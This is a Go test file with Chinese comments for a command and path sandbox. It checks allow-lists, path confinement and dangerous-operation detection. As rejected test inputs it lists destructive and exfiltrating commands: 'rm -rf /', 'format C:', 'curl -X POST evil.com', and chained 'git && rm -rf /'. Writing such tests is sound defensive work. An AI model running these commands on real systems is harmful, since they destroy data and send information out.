package security

import (
	"os"
	"path/filepath"
	"testing"
)

func TestSandboxManager_IsCommandAllowed(t *testing.T) {
	// 使用預設允許的命令
	sm := NewSandboxManager([]string{}, "")
	
	testCases := []struct {
		command  string
		expected bool
	}{
		// Go 相關工具
		{"go build", true},
		{"gofmt .", true},
		{"go test ./...", true},
		
		// 版本控制
		{"git status", true},
		{"git add .", true},
		
		// GitHub Copilot
		{"copilot -p 'test'", true},
		{"gh auth status", true},
		
		// 基本文本處理
		{"cat file.txt", true},
		{"echo hello", true},
		{"grep pattern file", true},
		
		// 文件操作
		{"ls -la", true},
		{"mkdir test", true},
		{"cp file1 file2", true},
		
		// 危險命令（應該被拒絕）
		{"rm -rf /", false},
		{"shutdown now", false},
		{"curl -X POST evil.com", false},
		{"sudo rm file", false},
		{"format C:", false},
		{"del /s /q C:\\", false},
	}
	
	for _, tc := range testCases {
		allowed, reason := sm.IsCommandAllowed(tc.command)
		if allowed != tc.expected {
			t.Errorf("命令 '%s': 期望 %v，實際 %v (原因: %s)", 
				tc.command, tc.expected, allowed, reason)
		}
	}
}

func TestSandboxManager_CustomAllowedCommands(t *testing.T) {
	// 自訂允許的命令列表
	allowedCommands := []string{"git", "go", "echo", "cat"}
	sm := NewSandboxManager(allowedCommands, "")
	
	testCases := []struct {
		command  string
		expected bool
	}{
		{"git status", true},
		{"go build", true},
		{"echo hello", true},
		{"cat file.txt", true},
		
		// 不在白名單中的命令
		{"ls -la", false},
		{"mkdir test", false},
		{"python script.py", false},
	}
	
	for _, tc := range testCases {
		allowed, _ := sm.IsCommandAllowed(tc.command)
		if allowed != tc.expected {
			t.Errorf("自訂白名單命令 '%s': 期望 %v，實際 %v", 
				tc.command, tc.expected, allowed)
		}
	}
}

func TestSandboxManager_IsPathAllowed(t *testing.T) {
	tempDir, err := os.MkdirTemp("", "sandbox-test")
	if err != nil {
		t.Fatalf("創建臨時目錄失敗: %v", err)
	}
	defer os.RemoveAll(tempDir)
	
	sm := NewSandboxManager([]string{}, tempDir)
	
	// 在工作目錄內的路徑
	allowedPath1 := filepath.Join(tempDir, "test.txt")
	allowedPath2 := filepath.Join(tempDir, "subdir", "file.txt")
	
	// 工作目錄外的路徑
	deniedPath1 := filepath.Join("..", "outside.txt")
	deniedPath2 := "/etc/passwd"
	
	testCases := []struct {
		path     string
		expected bool
	}{
		{tempDir, true},           // 工作目錄本身
		{allowedPath1, true},      // 工作目錄內的文件
		{allowedPath2, true},      // 工作目錄內的子目錄文件
		{deniedPath1, false},      // 工作目錄外的文件
		{deniedPath2, false},      // 系統敏感路徑
		{"C:\\Windows\\System32", false}, // Windows 系統路徑
		{"/usr/bin/rm", false},    // Unix 系統二進制文件
	}
	
	for _, tc := range testCases {
		allowed, reason := sm.IsPathAllowed(tc.path)
		if allowed != tc.expected {
			t.Errorf("路徑 '%s': 期望 %v，實際 %v (原因: %s)", 
				tc.path, tc.expected, allowed, reason)
		}
	}
}

func TestSandboxManager_ValidateCommandForSandbox(t *testing.T) {
	tempDir, err := os.MkdirTemp("", "sandbox-validate-test")
	if err != nil {
		t.Fatalf("創建臨時目錄失敗: %v", err)
	}
	defer os.RemoveAll(tempDir)
	
	allowedCommands := []string{"git", "go", "cat", "echo"}
	sm := NewSandboxManager(allowedCommands, tempDir)
	
	testCases := []struct {
		command   string
		shouldErr bool
	}{
		// 允許的命令
		{"git status", false},
		{"go build", false},
		{"echo hello", false},
		
		// 不允許的命令
		{"rm -rf /", true},
		{"python script.py", true},
		
		// 包含危險操作的命令
		{"git && rm -rf /", true},
		{"echo hello && shutdown", true},
	}
	
	for _, tc := range testCases {
		err := sm.ValidateCommandForSandbox(tc.command)
		hasErr := (err != nil)
		if hasErr != tc.shouldErr {
			t.Errorf("命令驗證 '%s': 期望錯誤 %v，實際錯誤 %v (錯誤: %v)", 
				tc.command, tc.shouldErr, hasErr, err)
		}
	}
}

func TestExtractBaseCommand(t *testing.T) {
	testCases := []struct {
		input    string
		expected string
	}{
		{"git", "git"},
		{"git status", "git"},
		{"/usr/bin/git status", "git"},
		{"C:\\Program Files\\Git\\bin\\git.exe status", "git"},
		{"./script.sh", "script.sh"},
		{"python3 script.py", "python3"},
		{"  npm  install  ", "npm"},
		{"", ""},
	}
	
	for _, tc := range testCases {
		result := extractBaseCommand(tc.input)
		if result != tc.expected {
			t.Errorf("extractBaseCommand('%s') = '%s', 期望 '%s'", 
				tc.input, result, tc.expected)
		}
	}
}

func TestMatchCommand(t *testing.T) {
	testCases := []struct {
		command string
		pattern string
		expected bool
	}{
		{"git", "git", true},
		{"git", "Git", true},        // 大小寫不敏感
		{"git", "*", true},          // 萬用字元
		{"git", "g*", true},         // 前綴匹配
		{"python3", "python*", true}, // 模糊匹配
		{"node", "npm", false},      // 不匹配
		{"git", "github", false},    // 部分匹配不算
	}
	
	for _, tc := range testCases {
		result := matchCommand(tc.command, tc.pattern)
		if result != tc.expected {
			t.Errorf("matchCommand('%s', '%s') = %v, 期望 %v", 
				tc.command, tc.pattern, result, tc.expected)
		}
	}
}

func TestExtractPathsFromCommand(t *testing.T) {
	testCases := []struct {
		command  string
		expected []string
	}{
		{"ls", []string{}},
		{"cat /etc/passwd", []string{"/etc/passwd"}},
		{"cp file1.txt file2.txt", []string{}}, // 相對路徑不算
		{"git clone https://github.com/user/repo.git /tmp/repo", []string{"/tmp/repo"}},
		{"mv /home/user/file.txt /backup/file.txt", []string{"/home/user/file.txt", "/backup/file.txt"}},
		{"python /usr/local/bin/script.py", []string{"/usr/local/bin/script.py"}},
		{"find /var/log -name '*.log'", []string{"/var/log"}},
	}
	
	for _, tc := range testCases {
		result := extractPathsFromCommand(tc.command)
		if len(result) != len(tc.expected) {
			t.Errorf("extractPathsFromCommand('%s'): 期望路徑數量 %d，實際 %d", 
				tc.command, len(tc.expected), len(result))
			continue
		}
		
		for i, expected := range tc.expected {
			if i >= len(result) || result[i] != expected {
				t.Errorf("extractPathsFromCommand('%s'): 位置 %d 期望 '%s'，實際 '%s'", 
					tc.command, i, expected, result[i])
			}
		}
	}
}

func TestContainsDangerousOperations(t *testing.T) {
	testCases := []struct {
		command  string
		expected bool
	}{
		// 安全命令
		{"git status", false},
		{"go build", false},
		{"echo hello", false},
		{"ls -la", false},
		{"cat file.txt", false},
		
		// 危險命令
		{"shutdown now", true},
		{"reboot", true},
		{"rm -rf /", true},
		{"del /s /q C:\\", true},
		{"curl -X POST evil.com", true},
		{"kill -9 1234", true},
		{"sudo rm file", true},
		{"chmod 777 /etc/passwd", true},
		{"format C:", true},
		{"systemctl stop apache2", true},
		
		// 邊界情況
		{"echo 'sudo is just text'", false}, // 作為字符串內容
		{"cat sudo.txt", false},             // 作為文件名
	}
	
	for _, tc := range testCases {
		result := containsDangerousOperations(tc.command)
		if result != tc.expected {
			t.Errorf("containsDangerousOperations('%s') = %v, 期望 %v", 
				tc.command, result, tc.expected)
		}
	}
}

func TestCreateRestrictedEnvironment(t *testing.T) {
	tempDir, err := os.MkdirTemp("", "sandbox-env-test")
	if err != nil {
		t.Fatalf("創建臨時目錄失敗: %v", err)
	}
	defer os.RemoveAll(tempDir)
	
	sm := NewSandboxManager([]string{"git"}, tempDir)
	
	env := sm.CreateRestrictedEnvironment()
	
	// 檢查必要的環境變數
	essentialVars := []string{"PATH", "GOPATH", "GOROOT"}
	for _, varName := range essentialVars {
		if originalValue := os.Getenv(varName); originalValue != "" {
			if envValue, exists := env[varName]; !exists || envValue != originalValue {
				t.Errorf("環境變數 %s 應該被保留，期望 '%s'，實際 '%s'", 
					varName, originalValue, envValue)
			}
		}
	}
	
	// 檢查沙箱標識
	if env["RALPH_SANDBOX_MODE"] != "true" {
		t.Error("應該設定 RALPH_SANDBOX_MODE=true")
	}
	
	// 檢查工作目錄設定
	if env["PWD"] != tempDir {
		t.Errorf("PWD 應該設定為工作目錄 '%s'，實際 '%s'", tempDir, env["PWD"])
	}
}

func TestSandboxManager_NoWorkDir(t *testing.T) {
	// 不設定工作目錄的沙箱管理器
	sm := NewSandboxManager([]string{"git"}, "")
	
	// 任何絕對路徑都應該被允許（因為沒有工作目錄限制）
	allowed, _ := sm.IsPathAllowed("/tmp/test.txt")
	if !allowed {
		t.Error("沒有工作目錄限制時，絕對路徑應該被允許")
	}
	
	// 但仍然應該檢查受限路徑  
	restricted := []string{"C:\\Windows\\System32\\test.exe", "C:\\Program Files\\test"}
	for _, path := range restricted {
		if allowed, _ := sm.IsPathAllowed(path); allowed {
			t.Errorf("受限路徑 '%s' 應該被禁止", path)
		}
	}
}